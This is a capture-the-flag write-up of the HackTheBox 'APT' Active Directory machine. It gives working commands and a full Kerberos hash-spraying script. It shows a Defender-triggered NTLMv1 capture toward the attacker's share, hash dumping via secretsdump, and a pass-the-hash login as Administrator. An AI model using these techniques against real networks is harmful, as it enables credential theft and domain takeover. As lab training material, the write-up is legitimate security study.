---
title: APT HackTheBox
author: Saad
date: 2024-10-10 00:00:00 +0500
categories:
  - HackTheBox
  - AD
  - Active Directory
tags:
  - hashspray
  - insane-boxes
  - active-directory
  - userenum
  - reg-enum
  - remote-registry
image: APT.png
media_subpath: /assets/img/htb
---

## Box Info:
This was one of the Insane boxes that took 7Ds for the first blood and box got very bad reviews, 11 Days after there was a hint added. Well Box is still very good to learn thing that are still useful to this day.
Box only has HTTP and RPC exposed to the player, enumerating the site we don't find anything that could be a attack vector. Enumerating the RPC with client provides an interesting object that can be used to disclose the IPv6 of the box. Box is protected via firewall. via IPv6 can give access to backup shares, backup shares contains dump of whole AD and Registry which can be used to enumerate users and sprayhashes to find a valid one, this user can access the registry which has cerds to another user on the box, looking at powershell history of the user, we find that machine is configured to use auth via NTLMv1 which can be captured with responder and get the system hash and dump the SAM and SYSTEM to get Admin's hash for the box.

# Recon

## Nmap
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 09:45 CDT
Nmap scan report for 10.129.96.60
Host is up (0.040s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Gigantic Hosting | Home
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.60 seconds
```

Looking at the results we find that there is only two open ports.
HTTP and MS-RPC.
### Port 80
We can't find much on the site itself on port 80. it's static site.
![](port80.png)

I looked at the `support.html` page and still didn't find anything
![](support_page.png)

### Port 135

We can't connect to RPC via `rpcclient` since there is no TCP 445 or 139 open.

Port 135 is Endpoint Mapper and Component Object Model (COM) service control manager, we can use `impacket`'s `rpcmap` and see the mappings.
_The tool needs `stringbinding` arguments to enable it's connection._
looking at the help we can find it:
```
~$ impacket-rpcmap --help
ncacn_ip_tcp:192.168.0.1[135]
ncacn_np:192.168.0.1[\pipe\spoolss]
ncacn_http:192.168.0.1[593]
ncacn_http:
```
This is an [RPCE Connection over TCP](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/95fbfb56-d67a-47df-900c-e263d6031f22).
Let's run it against the box:
```
└──╼ [★]$ impacket-rpcmap 'ncacn_ip_tcp:10.129.96.60'
Impacket v0.11.0 - Copyright 2023 Fortra

Procotol: N/A
Provider: rpcss.dll
UUID: 00000136-0000-0000-C000-000000000046 v0.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1

Procotol: N/A
Provider: rpcss.dll
UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0

Protocol: [MS-RPCE]: Remote Management Interface
Provider: rpcrt4.dll
UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2

Procotol: N/A
Provider: rpcss.dll
UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0

Procotol: N/A
Provider: rpcss.dll
UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0

```

The scan provides bunch of RPC endpoints and their UUIDs.
The MS-DCOM ones are defined [in here](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4).  looking at there we can find `IObjectExporter` or `IOXIDResolver`. We can use [this script by mubix](https://github.com/mubix/IOXIDResolver/blob/main/IOXIDResolver.py)
to resolve the IPv6.
```console
~$ python3 scripts/IOXIDResolver.py -t 10.129.96.60
[*] Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::4558:81d0:83cf:bba0
Address: dead:beef::b885:d62a:d679:573f
```

Adding it to `/etc/hosts`
```
dead:beef::b885:d62a:d679:573f apt6.htb
```

### Nmap on IPv6

Scanning the IPv6 reveals much more on the box.

```console
└──╼ [★]$ nmap -6 -p- -sCV --min-rate 10000 -oA nmap/ipv6.scan apt.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 11:26 EDT
Nmap scan report for apt.htb (dead:beef::b885:d62a:d679:573f)
Host is up (0.38s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Gigantic Hosting | Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-11 15:27:07Z)
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2024-10-11T15:28:49+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
|_ssl-date: 2024-10-11T15:28:49+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2024-10-11T15:28:49+00:00; -1s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  unknown
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  unknown
49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49670/tcp open  unknown
49673/tcp open  unknown
49685/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-11T15:28:08
|_  start_date: 2024-10-11T14:34:36
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: apt
|   NetBIOS computer name: APT\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System time: 2024-10-11T16:28:09+01:00
|_clock-skew: mean: -9m59s, deviation: 24m26s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.94 seconds

```
All the ports open indicates that it's a DC.
_we can update our /etc/hosts and add `htb.local`._
### SMB Port 445

Netexec has support for IPv6, running it against we find a share `backup` which looks very interesting since we have anon login.
```console
└──╼ [★]$ nxc smb apt.htb --shares -u '' -p ''
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\: 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Enumerated shares
SMB         dead:beef::b885:d62a:d679:573f 445    APT              Share           Permissions     Remark
SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----           -----------     ------
SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ            
SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC
SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share
```

_We can also list it with `smbclient` if netexec isn't working._
```
└──╼ [★]$ smbclient -L \\\apt.htb
Password for [WORKGROUP\user]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	backup          Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
apt.htb is an IPv6 address -- no workgroup available
```

We can find a zip file in backup share and BOOM! we can download it.
```console
└──╼ [★]$ smbclient \\\\apt.htb\\backup
Password for [WORKGROUP\user]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 24 03:30:52 2020
  ..                                  D        0  Thu Sep 24 03:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020
		5114623 blocks of size 4096. 2634416 blocks available
smb: \> get backup.zip
getting file \backup.zip of size 10650961 as backup.zip (2071.6 KiloBytes/sec) (average 2071.6 KiloBytes/sec)
```
_If you can't download the backup.zip file, consider using pwnbox for it._
# User
## backup.zip
Unfortunately we can't unzip the backup.zip file since it's password protected.
### Generate/Crack  the hash
But we can use `zip2john` to get the hash of the zip and crack it with `hashcat`.
```console
└──╼ [★]$ zip2john backup.zip > hash.txt
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 type=8
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 type=8
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb type=8
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
└──╼ [★]$ cat hash.txt 
backup.zip:$pkzip$4*1*1*0*8*24*9beb*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*65d9*2a1c4c81fb6009425c2d904699497b75d843f69f8e623e3edb81596de9e732057d17fae8*1*0*8*24*acd0*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, registry/SYSTEM, Active Directory/ntds.dit:backup.zip
```

Let's crack it with hashcat. looking at hashcat examples we can find it matches the `PKZIP Compressed Multi-File`. which is mode 17220.
```console
hashcat -m 17220 hash.txt /usr/share/wordlists/rockyou.txt --user
```
The Password is: _iloveyousomuch_.
unzipping it we find really interesting things. whole AD backup and registry.

### Dumping hashes from backup

Since we have `ntds.dit, SECURITY, SYSTEM` we can dump the hashes using `Impacket`'s `secretdump`.
we only need ntds.dit and SYSTEM to dump the hashes.
```console
└──╼ [★]$ impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL > backup.txt
└──╼ [★]$ grep ':::' backup.txt | wc -l
2000
```
## User Enum

We have `2000` users, we can validate what are the user that exist on machine from this backup list via Kerberos (we saw on IPv6 TCP 88).
Let's filter the users first.
```console
└──╼ [★]$ grep ':::' backup.txt | awk -F: '{print $1}' > users.list
└──╼ [★]$ wc -l users.list 
2000 users.list
```
here is a bit tricky part, in order to get kerbrute connected with DC we need to define IPv6 as this:
```console
dead:beef::b885:d62a:d679:573f apt6.htb htb.local
```

We get valid users:
```console
└──╼ [★]$ ./kerbrute_linux_amd64 userenum -d htb.local --dc apt6.htb users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/11/24 - Ronnie Flathers @ropnop

2024/10/11 11:31:14 >  Using KDC(s):
2024/10/11 11:31:14 >  	apt6.htb:88

2024/10/11 11:31:19 >  [+] VALID USERNAME:	 APT$@htb.local
2024/10/11 11:31:19 >  [+] VALID USERNAME:	 Administrator@htb.local
2024/10/11 11:39:41 >  [+] VALID USERNAME:	 henry.vinson@htb.local
```
## Shell as henry.vinson_ad
Well we found three valid users one of them is system other is Admin and then a low privileged user `henry.vinson`.
The hash we found in dump for this user doesn't work since it's a old hash.
### Wail2Ban
We can't spray hashes on AD for user `henry.vinson` it goes till 60 and then machine stops responding. Reason being that machine has wail2ban installed.
### HashSpray.py
We can use a script written by the box author and bit modified to spray hashes and find valid one through Kerberos Brute. 
Here is the script that validates all the hashes that we found in backup and finds the valid one.
```python
#!/usr/bin/python3
from __future__ import division, print_function
import sys
import argparse
import socket
from time import sleep
import re
from impacket.smbconnection import SMBConnection
from impacket import smbconnection
import multiprocessing
import traceback
from binascii import unhexlify
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5 import constants
from impacket.krb5.types import Principal

def gethost_addrinfo(hostname):
    try:
        for res in socket.getaddrinfo(hostname, None, socket.AF_INET6,
                   socket.SOCK_DGRAM, socket.IPPROTO_IP, socket.AI_CANONNAME):
            af, socktype, proto, cannoname, sa = res
    except socket.gaierror:
        for res in socket.getaddrinfo(hostname, None, socket.AF_INET,
                 socket.SOCK_DGRAM, socket.IPPROTO_IP, socket.AI_CANONNAME):
            af, socktype, proto, cannoname, sa = res

    return sa[0]


def login(username, password, domain, lmhash, nthash, aesKey, dc_ip):
    dc_ip = gethost_addrinfo(dc_ip)
    try:
        kerb_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        getKerberosTGT(kerb_principal, password, domain,
            unhexlify(lmhash), unhexlify(nthash), aesKey, dc_ip)
        print('[+] Success %s/%s' % (domain, username))
        return True
    except KerberosError as e:
        if (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value) or \
           (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value) or \
           (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_WRONG_REALM.value):
            print("[-] Could not find username: %s/%s" % (domain, username))
        elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
            return False
        else:
            print(e)
    except socket.error as e:
        print('[-] Could not connect to DC')
    return False


DOMAIN = 'htb.local'
USERNAME = 'henry.vinson'

def _login(username, hash):
    return login(username, '', DOMAIN, '', hash, None, "htb.local")

passwords = [x.strip() for x in open("hashes.txt").readlines()]
SLEEP_TIME = 5

for x in passwords:
    if _login(USERNAME, x):
        print(f"[+] Success {x}")
        exit()
    sleep(SLEEP_TIME)
```
we have to filter the hashes:
```console
cat dump.txt | grep ":::" | cut -d: -f 3-4 > hashes
cat hashes | tr ":" " " > hashes2
cat hashes2 | awk {'print $2'} > hashes.txt
```
Running the script against the box gives us the valid hash for the user `henry.vinson`
```console
└──╼ [★]$ python3 hashspray.py 
[+] Success htb.local/henry.vinson
[+] Success e53d87d42adaa3ca32bdb34a876cbffb
```
_Note: it's going to take very long time. ~18 minutes_

We can't get any much info as this user since it doesn't have WinRM permissions. but we can access the remote registry. you can read more about it [here](https://itfordummies.net/2016/09/06/read-remote-registry-powershell/).
There is another cool way to pop up a shell using mimikatz that [0xdf showed in his blog for this box](https://0xdf.gitlab.io/2021/04/10/htb-apt.html#remote-access). 
Let's try to look at remote registry using `Impacket`'s `reg`.
```console
└──╼ [★]$ impacket-reg -hashes  aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation


[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE
HKU\SOFTWARE\GiganticHostingManagementSystem
HKU\SOFTWARE\Microsoft
HKU\SOFTWARE\Policies
HKU\SOFTWARE\RegisteredApplications
HKU\SOFTWARE\Sysinternals
HKU\SOFTWARE\VMware, Inc.
HKU\SOFTWARE\Wow6432Node
HKU\SOFTWARE\Classes
```

All of these regs looks normal except the `GiganticHostingManagementSystem`, Let's take a look at it.
Woah, we find the cerds for another user.
```console
└──╼ [★]$ impacket-reg -hashes  aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE\\GiganticHostingManagementSystem
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE\GiganticHostingManagementSystem
	UserName	REG_SZ	 henry.vinson_adm
	PassWord	REG_SZ	 G1#Ny5@2dvht
```

Evil-winrm works, we can get a shell and read the user flag:
![](winrm.png)

# Administrator

## Shell as Administrator

### PowerShell History

There are only two accounts henry.vinson and henry.vinson_adm other then Administrator.
There is a PowerShell history file we can read in henry.vinson_adm's directory.
```powershell
*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\windows\PowerShell\PSReadline> cat ConsoleHost_history.txt
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
```
![](ntmlv1.png)
According to [Learn MS](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level), level 2 means it's configured to allow auth via NTLMv1 which insecure.
Net-NTMLv1 has weak cryptography and it can be cracked, goal here is to capture the Net-NTLM hash now.

### Getting machine hash
We can use Windows Defender to scan a file on our host that doesn't exist and capture the Net-NTML hash of machine account, since it uses the machine account to scan it, and we can capture it via responder. [Here is more explanation of how to scan a file via CLI](https://learn.microsoft.com/en-us/defender-endpoint/command-line-arguments-microsoft-defender-antivirus) 
But in order for crack.sh to crack the hashes, we need to edit the challenge in responder conf file. more explained on [crack.sh](https://crack.sh/netntlm/).
The conf file is under `/usr/share/responder` named `Responder.conf`.

```console
sudo responder -I tun0 --lm
```
_`--lm` flag is to force a downgrade to Net-NTMLv1_

We have responder running on the other side now we can start the Defender scan.
```
.\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.79\share\hi_my_name_is_hash.txt
```

- `-Scan` starts the scan.
-  `-ScanType 3` tells it to scan a specific file.
-  `-File \\IP\Share\doesnt_exist.o` will tell defender to scan a file on our machine.

Looking at responder tab, we got the NTLM with the challenge response
```console
[SMB] NTLMv1 Client   : 10.129.96.60
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
```

We can send this hash to [crack.sh](https://crack.sh/get-cracking), The hash comes back in the mail box in couple of mins.
In this format: 
```
NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
```

The machine hash is 
```console
d167c3238864b12f5f82feae86a7f798
```

_Sadly crack.sh's DES cracker is down, and you can't crack the hash there might be other ways to do it since it's DES._

We can't login as the machine account into the machine but we can dump the hashes of all other users:
```console
└──╼ [★]$ impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 htb.local/APT\$@htb.local
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
[*] Cleaning up...
```

And we have the Administrator hash of the box.
```console
└──╼ [★]$ evil-winrm -i htb.local -u Administrator -H c370bddf384a691d811ff3495e8a72e2

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Hope you liked my writeup, Thanks for reading it.
